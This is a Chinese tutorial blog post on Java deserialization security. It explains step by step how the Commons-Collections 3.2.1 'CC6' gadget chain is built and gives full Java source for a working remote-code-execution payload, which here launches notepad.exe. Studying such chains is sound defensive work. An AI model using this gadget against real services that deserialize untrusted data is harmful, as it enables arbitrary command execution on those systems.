---
title: Commons-Collections篇03-CC6链
date: 2025-9-26 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

# 环境搭建

- jdk版本不受限制
- Commons-Collections 3.2.1

# 初步构造

CC6链用了CC1链-`Lazymap`链的前半段，后半段用了URLDNS链

前半段还是使用`lazymap`中的`get`方法去执行`transform`

```java
Runtime runtime = Runtime.getRuntime();
        InvokerTransformer transformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"});
        Class<LazyMap> lazymap = LazyMap.class;
        HashMap<Object,Object> hashmap = new HashMap<>();
        Map decoratemap = LazyMap.decorate(hashmap,transformer);
        Method lazymapget = lazymap.getDeclaredMethod("get", Object.class);
        lazymapget.setAccessible(true);
        lazymapget.invoke(decoratemap,runtime);
```

# TiedMapEntry

接下来就寻找调用了`get`方法的函数

`TiedMapEntry`中的`getValue`方法调用了`get`方法,并且`getValue`是`public`属性

然后去看看这个`map`是什么

![image-20250926140442843](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926140442843.png)

这个类的构造函数也是`public`，构造函数可以给`map`赋值

![image-20250926140716302](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926140716302.png)

那现在改为使用`TiedMapEntry.getValue()`来命令执行，代码如下：

```java
 Runtime runtime = Runtime.getRuntime();
        InvokerTransformer transformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"});
        
        HashMap<Object,Object> hashmap = new HashMap<>();
        Map decoratemap = LazyMap.decorate(hashmap,transformer);
        
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,runtime);
        tiedMapEntry.getValue();
```

顺便把`Runtime对象`也改为可以序列化的形式，这里和上面还有一个区别就是`TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"key");`将其中的`runtime`对象改为字符串了

因为`tiedMapEntry.getValue()` 会调用 `decoratemap.get("key")`。然后再往上调用`chainedTransformer.transform("key")`。但是`ConstantTransformer.transform()`这个方法无论传入什么都会返回输入的参数，也就是`Runtime.class`

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

                HashMap<Object,Object> hashmap = new HashMap<>();
        Map decoratemap = LazyMap.decorate(hashmap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"key");
        tiedMapEntry.getValue();

```

接下来就找哪个方法调用了`getValue()`，同名类下的`hashCode()`调用了`getValue()`

![image-20250926142631749](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926142631749.png)

将代码简单改一下改为调用`hashCode`函数也可以命令执行

```java
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
                HashMap<Object,Object> hashmap = new HashMap<>();
        Map decoratemap = LazyMap.decorate(hashmap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"key");
        tiedMapEntry.hashCode();

```

# 最终构造

## put方法提前运行hash函数

接下来就要找哪个函数调用的`hashCode()`，这就回到的`URLDNS`链

`HashMap.hash()`调用了`hashCode()`->`HashMap.readObject()`调用了`hash()`

![image-20250926143253916](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926143253916.png)

![image-20250926150323580](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926150323580.png)

接下来就用`put`方法构造一个`hashmap`进行序列化就可以了

```
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashmap = new HashMap<>();
        LazyMap decoratemap = (LazyMap)LazyMap.decorate(hashmap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"key");

        hashmap.put(tiedMapEntry,decoratemap);
```

但是不需要序列化和反序列化也可以弹出计算器

是因为`put`方法时就已经运行了`hash`函数所以不需要序列化也可以命令执行

![image-20250926150257430](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926150257430.png)

## 绕过

绕过思路也很简单：

`hash()`函数中运行的是`TiedMapEntry.hashCode()`，而`TiedMapEntry()`中主要进行命令执行的参数主要是`map`，所以我们在`put`前给一个空的`map`，在`put`后再将`decoratemap`赋值给`TiedMapEntry()`中的`map`参数

利用反射去修改其中的参数值就可以了

![image-20250926150715573](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926150715573.png)

```java
 	Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashmap = new HashMap<>();
        Map decoratemap = LazyMap.decorate(hashmap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"key");

        Field mapfield = tiedMapEntry.getClass().getDeclaredField("map");
        mapfield.setAccessible(true);
        mapfield.set(tiedMapEntry,new HashMap());
        hashmap.put(tiedMapEntry,"value");
        mapfield.set(tiedMapEntry,decoratemap);
        serialize(hashmap);
        unserialize("test.txt");
```

# 调用链

![image-20250926160030849](./Commons-Collections%E7%AF%8703-CC6%E9%93%BE/image-20250926160030849.png)

# 完整代码

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.rmi.server.ExportException;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"notepad.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashmap = new HashMap<>();
        Map decoratemap = LazyMap.decorate(hashmap,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,"key");

        Field mapfield = tiedMapEntry.getClass().getDeclaredField("map");
        mapfield.setAccessible(true);
        mapfield.set(tiedMapEntry,new HashMap());
        hashmap.put(tiedMapEntry,"value");
        mapfield.set(tiedMapEntry,decoratemap);
        serialize(hashmap);
        unserialize("test.txt");


    }
    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("test.txt"));
        oos.writeObject(obj);
    }
    public static void unserialize(Object obj) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("test.txt"));
        ois.readObject();
    }
}
```

